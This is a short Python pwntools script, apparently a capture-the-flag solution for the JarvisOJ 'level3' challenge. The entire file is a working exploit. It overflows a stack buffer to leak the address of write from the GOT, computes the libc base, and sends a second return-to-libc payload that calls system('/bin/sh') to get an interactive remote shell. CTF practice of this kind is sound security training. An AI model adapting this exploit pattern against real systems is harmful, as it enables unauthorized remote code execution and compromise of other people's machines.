from pwn import *
conn=remote("pwn2.jarvisoj.com","9879")
e=ELF("level3")
libc=ELF("libc-2.19.so")
#libc=ELF('/usr/lib/i386-linux-gnu/libc-2.29.so')
write_addr=e.symbols['write']
vul_addr=e.symbols['vulnerable_function']
got_addr=e.got['write']

conn.recvuntil("Input:\n")
payload1="a"*0x88+"bbbb"+p32(write_addr)+p32(vul_addr)+p32(1)+p32(got_addr)+p32(4)
conn.send(payload1)
temp = conn.recv(4)
true_address = u32(temp[0:4])
print hex(true_address)

offset=true_address-libc.symbols['write']

bin_addr=libc.search("/bin/sh").next()+offset
sys_addr=libc.symbols['system']+offset

payload2="a"*0x88+"bbbb"+p32(sys_addr)+"junk"+p32(bin_addr)
conn.send(payload2)
conn.interactive()
